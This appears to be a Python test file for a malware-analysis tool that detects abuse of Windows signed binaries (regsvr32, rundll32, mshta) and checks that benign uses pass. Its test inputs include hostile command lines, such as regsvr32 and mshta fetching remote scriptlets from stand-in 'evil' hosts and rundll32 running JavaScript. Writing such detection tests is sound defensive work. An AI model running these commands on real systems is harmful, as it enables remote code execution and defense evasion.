"""LOLBin signed-proxy-execution detection (T1218.010/.011/.005).

Detection must fire on *suspicious* usage only — regsvr32/rundll32 are
ubiquitous and benign, so mere presence must never be flagged.
"""

from __future__ import annotations

from maljan.analysis.lolbin_layer import classify_lolbin
from maljan.tools.knowledge import lolbin_lookup


class TestClassifyLolbin:
    def test_regsvr32_squiblydoo_flagged(self) -> None:
        assert classify_lolbin("regsvr32 /s /n /u /i:http://evil/a.sct scrobj.dll") == (
            "T1218.010",
            "regsvr32",
        )

    def test_regsvr32_dll_from_temp_flagged(self) -> None:
        assert classify_lolbin(r"regsvr32 /s C:\Users\x\AppData\Local\Temp\eviI.dll") == (
            "T1218.010",
            "regsvr32",
        )

    def test_regsvr32_benign_system32_not_flagged(self) -> None:
        assert classify_lolbin(r"regsvr32 /s C:\Windows\System32\scrrun.dll") is None

    def test_rundll32_javascript_flagged(self) -> None:
        cmd = 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'
        assert classify_lolbin(cmd) == ("T1218.011", "rundll32")

    def test_rundll32_ordinal_export_flagged(self) -> None:
        assert classify_lolbin(r"rundll32 C:\Users\x\AppData\Local\Temp\a.dll,#1") == (
            "T1218.011",
            "rundll32",
        )

    def test_rundll32_benign_not_flagged(self) -> None:
        assert classify_lolbin("rundll32 shell32.dll,Control_RunDLL") is None

    def test_mshta_remote_flagged(self) -> None:
        assert classify_lolbin("mshta http://evil.example/x.hta") == ("T1218.005", "mshta")

    def test_non_lolbin_not_flagged(self) -> None:
        assert classify_lolbin(r"C:\Windows\System32\notepad.exe foo.txt") is None


class TestLolbinLookup:
    """The tool an agent actually calls. It reports hits and asserts nothing."""

    def test_a_hit_names_the_binary_and_the_technique(self) -> None:
        answer = lolbin_lookup(["mshta http://evil/x.hta"])
        assert answer["checked"] == 1
        assert answer["hits"] == [
            {
                "binary": "mshta",
                "technique_id": "T1218.005",
                "pattern": "mshta http://evil/x.hta",
            }
        ]

    def test_a_benign_invocation_produces_no_hit(self) -> None:
        answer = lolbin_lookup(["rundll32 shell32.dll,Control_RunDLL", "   "])
        assert answer["hits"] == []

    def test_no_confidence_number_is_invented_for_a_match(self) -> None:
        hit = lolbin_lookup(["regsvr32 /i:http://evil/a.sct scrobj.dll"])["hits"][0]
        assert "confidence" not in hit
